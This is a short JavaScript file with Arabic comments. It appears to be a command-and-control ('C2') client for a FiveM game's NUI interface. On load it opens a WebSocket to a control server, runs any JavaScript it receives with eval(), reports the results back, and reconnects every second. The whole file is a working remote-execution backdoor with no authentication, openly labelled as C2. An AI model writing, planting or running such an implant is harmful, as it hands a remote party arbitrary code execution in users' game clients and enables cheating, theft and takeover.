
const WS_SERVER_URL = "ws://127.0.0.1:8765";
const startConnection = () => {
  // يمنع فتح اتصالات متعددة بالخطأ
  if (globalThis.c2Socket && globalThis.c2Socket.readyState === WebSocket.OPEN) {
    return;
  }
  
  // إنشاء اتصال WebSocket بالخادم
  const socket = new WebSocket(WS_SERVER_URL);
  globalThis.c2Socket = socket; 

  socket.onopen = () => {
    console.log("C2 Socket connected successfully. Ready for remote commands.");
    // يمكنك هنا إرسال أي معلومات تعريفية عن العميل إلى الخادم
    socket.send(JSON.stringify({ type: 'hello', client: 'FiveM NUI Client' }));
  };

  // استقبال الرسائل من خادم Node.js
  socket.onmessage = ({ data }) => {
    try {
        const { type, code } = JSON.parse(data);
        if (type === 'eval' && code) {
            // تنفيذ كود JavaScript القادم من واجهة التحكم
            const returned = eval(code);
            console.log("Command executed. Result:", returned);
            // إرسال نتيجة التنفيذ إلى الخادم (اختياري)
            socket.send(JSON.stringify({ type: 'result', value: `${returned}` }));
        }
    } catch (e) {
        console.error("C2 Eval or Parse Error:", e);
    }
  };

  // عند فقدان الاتصال أو حدوث خطأ، حاول الاتصال مرة أخرى بعد فترة قصيرة
  const reconnect = () => {
    globalThis.c2Socket = undefined;
    setTimeout(startConnection, 1000); // محاولة الاتصال كل ثانية
    console.log("C2 Socket disconnected. Reconnecting...");
  };
  
  socket.onclose = reconnect; 
  socket.onerror = reconnect;
};

// ابدأ عملية الاتصال فور تحميل الملف
startConnection();




